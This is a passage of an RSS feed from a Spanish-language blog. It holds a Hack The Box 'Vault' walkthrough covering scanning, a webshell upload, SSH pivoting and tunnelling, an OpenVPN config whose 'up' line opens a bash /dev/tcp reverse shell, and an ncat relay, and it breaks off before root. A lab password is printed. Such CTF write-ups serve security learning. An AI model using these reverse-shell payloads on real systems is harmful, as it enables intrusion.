&lt;/div&gt;&lt;p&gt;INFO=&amp;gt;https://www.shellhacks.com/how-to-grant-root-access-user-root-privileges-linux/&lt;/p&gt;
&lt;video autoplay&gt;
  &lt;source src=&#34;https://sckull.github.io/images/posts/htb/redcross/privilege-escalation-FINAL.mp4&#34; type=&#34;video/mp4&#34;&gt;  
  Your browser does not support the video tag.
&lt;/video&gt; 
&lt;h3 id=&#34;sudo-_ツ_&#34;&gt;Sudo ¯_(ツ)_/¯&lt;/h3&gt;
&lt;p&gt;Pudimos haber hecho solamente &lt;code&gt;sudo bash&lt;/code&gt; y obteniamos una shell root #meh.&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/redcross/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/redcross/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Vault</title>
        <link>https://sckull.github.io/posts/vault/</link>
        <pubDate>Sat, 06 Apr 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 06 Apr 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/vault/</guid>
        <description>Vault es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Vault es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&#34;masscan&#34;&gt;MASSCAN&lt;/h2&gt;
&lt;p&gt;Escaneo a todos los puertos UDP/TCP.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 22/tcp on 10.10.10.109                                    
Discovered open port 80/tcp on 10.10.10.109
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo a puertos 22, 80.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.70 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.109
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.42s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.18 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Site doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;UTF-8&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 13.97 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Puerto 80 http encontramos una pagina solo con el siguiente contenido, en el que anuncian a un nuevo cliente &amp;lsquo;Sparklays&amp;rsquo; pero su pagina (Sparklays.com) aun esta en construccion por lo que no puede ser accedida.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2014.48.50.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Agregamos todas las palabras posibles del contenido de la pagina a un diccionario para gobuster utilizando cewl.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;cewl -w vault_custom.txt http://10.10.10.109/ &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; tr &lt;span class=&#34;s1&#34;&gt;&amp;#39;A-Z&amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;a-z&amp;#39;&lt;/span&gt; &amp;lt; vault_custom.txt &amp;gt; vault_lower.txt &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cat vault_custom.txt vault_lower.txt &amp;gt;&amp;gt; /usr/share/wordlist/dirb/common.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2015.18.34.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;dirbuster&#34;&gt;DIRBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizando dirbuster encontramos las siguientes rutas.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2015.54.15.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;adminphp&#34;&gt;/admin.php&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2015.57.57.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;loginphp&#34;&gt;/login.php&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2015.58.30.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;designdesignhtml&#34;&gt;/design/design.html&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2015.59.06.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;designchangelogophp&#34;&gt;/design/changelogo.php&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2015.59.37.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;designuploads&#34;&gt;/design/uploads/&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2016.00.13.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;simple-php-shell&#34;&gt;SIMPLE PHP SHELL&lt;/h2&gt;
&lt;p&gt;Para obtener una shell vamos a concentrarnos en changelogo.php es la unica ruta donde podemos subir archivos y considerando que, al subir un archivo se guarda en &lt;code&gt;/uploads/&lt;/code&gt; podremos ejecutar  nuestro payload o comandos, para ello vamos a copiar un webshell que kali trae en su sistema.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2016.15.39.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Enumerando los directorios nos encontramos con un archivo &lt;code&gt;ssh&lt;/code&gt; que contiene el nombre de &lt;code&gt;Dave&lt;/code&gt; y un aposible contraseña para el servicio ssh.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2016.18.43.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;shell---ssh&#34;&gt;SHELL - SSH&lt;/h2&gt;
&lt;p&gt;Satisfactoriamente nos logeamos con las credenciales para el usuario dave.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2016.20.21.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Dentro de los archivos de dave encontramos dos archivos mas &lt;code&gt;key&lt;/code&gt; y &lt;code&gt;Servers&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2016.23.56.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Servers contiene IPs y el nombre que tiene cada una de ellas, y en key una &amp;ldquo;contraseña&amp;rdquo;, nmap no esta instalado en la maquina por lo que vamos a utilizar netcat para hacer un escaneo de los puertos de cada ip que nos aparece en el archivo Servers.&lt;/p&gt;
&lt;p&gt;NETCAT =&amp;gt; &lt;a href=&#34;https://www.cyberciti.biz/faq/linux-port-scanning/&#34;&gt;https://www.cyberciti.biz/faq/linux-port-scanning/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Dentro de las interfaces encontramos una interna en la cual nos identificamos con la ip &lt;code&gt;192.168.122.1&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2017.26.59.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Primero verificamos si hay mas de una IP disponible en un rango del 1 al 10.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2017.25.37.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2017.26.07.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ahora sabemos que existen otras dos IP dentro de la interfaz &lt;code&gt;virbr0 (192.168.122.5, 192.168.122.4)&lt;/code&gt; y por ahora solo tenemos acceso a una &lt;code&gt;192.168.122.1&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Vault_diagram_1.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Escaneo de puertos por IP&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2016.44.10.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Podemos observar que la IP &lt;code&gt;192.168.122.4&lt;/code&gt; tiene dos puertos abiertos 80 y 22, mientras que la otra IP &lt;code&gt;192.168.122.5&lt;/code&gt; netcat no encontro ningun puerto abierto pero si esta activa la direccion IP.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;tuneling-ssh&#34;&gt;TUNELING SSH&lt;/h2&gt;
&lt;p&gt;Vamos a traer localmente la IP &lt;code&gt;192.168.122.4&lt;/code&gt; y su puerto 80 a nuestra maquina, para poder analizar el puerto 80.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ssh -L 9090:192.168.122.4:80 dave@10.10.10.109
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Vault_diagram_2.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ejecutamos el comando localmente.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2018.08.57.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Revisamos si el puerto esta a la escucha localmente.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2018.09.32.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Procedemos a abrir 127.0.0.1:9090 en firefox para ver que contenido tiene.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2018.11.02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;dns-settings&#34;&gt;/DNS Settings&lt;/h3&gt;
&lt;p&gt;Esta pagina no existe por lo que no encontramos nada.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2018.11.21.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;vpn-configuration&#34;&gt;/VPN Configuration&lt;/h3&gt;
&lt;p&gt;Al parecer es una pagina para modificar y executar archivo ovpn&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2018.12.13.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;shell-inversa---ovpn&#34;&gt;SHELL INVERSA - OVPN&lt;/h2&gt;
&lt;p&gt;En &lt;a href=&#34;https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da&#34;&gt;https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da&lt;/a&gt; nos muestran como se puede realizar una shell inversa con las siguiente configuracion:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;remote 192.168.1.245
ifconfig 10.200.0.2 10.200.0.1
dev tun
script-security 2
up &amp;#34;/bin/bash -c &amp;#39;/bin/bash -i &amp;gt; /dev/tcp/192.168.1.218/8181 0&amp;lt;&amp;amp;1 2&amp;gt;&amp;amp;1&amp;amp;&amp;#39;&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Como referencia para realizar una shell inversa tomamos la documentacion de openvpn (&lt;a href=&#34;https://openvpn.net/community-resources/reference-manual-for-openvpn-2-4/&#34;&gt;https://openvpn.net/community-resources/reference-manual-for-openvpn-2-4/&lt;/a&gt;) para realizar algunos cambios, y este es el resultado:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;remote 192.168.122.4
dev tun
nobind
script-security 2
up &amp;#34;/bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.122.1/9999 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ya que la IP donde esta corriendo la pagina es &lt;code&gt;192.168.122.4&lt;/code&gt; vamos a obtener una shell inversa de esa maquina, por lo que en la maquina &lt;code&gt;dave (192.168.122.1)&lt;/code&gt; vamos a poner a la escucha netcat y asi obtener nuestra shell.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Vault_diagram_3.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Presionamos Test VPN&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2018.23.20.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Y obtenemos nuestra shell inversa&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2018.25.20.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Y nuestra bandera &lt;code&gt;USER&lt;/code&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2018.26.40.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;De igual forma encontramos un archivo ssh que contiene credenciales de lo que parece ser ssh para el usuario dave.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;SSH dave 192.168.122.4
dave
dav3gerous567
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Intentamos logearnos y satisfactoriamente tenemos acceso por medio de ssh a &lt;code&gt;192.168.122.4&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2018.30.37.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nuestro progreso hasta ahora&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Vault_diagram_4.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Enumerando dentro de &lt;code&gt;192.168.122.4&lt;/code&gt; encontramos en el historial de comandos (.bash_history) una conexion a &lt;code&gt;192.168.5.2&lt;/code&gt; por el puerto 987 utilizando netcat por el puerto local 5555, tambien un escaneo de nmap a esa misma ip.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2018.37.04.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Intentamos hacer un escaneo a esa IP &lt;code&gt;192.168.5.2&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2018.41.24.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2018.45.30.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Dentro de la carpeta &lt;code&gt;/var/www/DNS&lt;/code&gt; encontramos un archivo llamado interfaces, vemos que se han agregado nuevas rutas estaticas a la tabla de enrutamiento.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2020.01.01.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;La ruta de destino que tenga &lt;code&gt;192.168.5.0&lt;/code&gt; sera redirigido a la puerta de enlace &lt;code&gt;192.168.122.5&lt;/code&gt; por medio de la interfaz &lt;code&gt;ens3&lt;/code&gt;.&lt;/p&gt;
&lt;h4 id=&#34;tercera-ip-19216852&#34;&gt;Tercera IP (192.168.5.2)&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Vault_diagram_5.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;root---flag&#34;&gt;ROOT - FLAG&lt;/h2&gt;
&lt;p&gt;Vamos a utilizar el mismo comando que esta en el historial para poder conectarnos a &lt;code&gt;192.168.5.2&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ncat -l &lt;span class=&#34;m&#34;&gt;5555&lt;/span&gt; --sh-exec &lt;span class=&#34;s2&#34;&gt;&amp;#34;ncat 192.168.5.2 987 --source-port=4444&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2019.00.59.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/vault/Screenshot%20from%202019-04-04%2019.02.32.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos nuestra shell en &lt;code&gt;192.168.5.2&lt;/code&gt; y nuestra bandera root pero esta encriptada y necesitamos una clave.&lt;br /&gt;
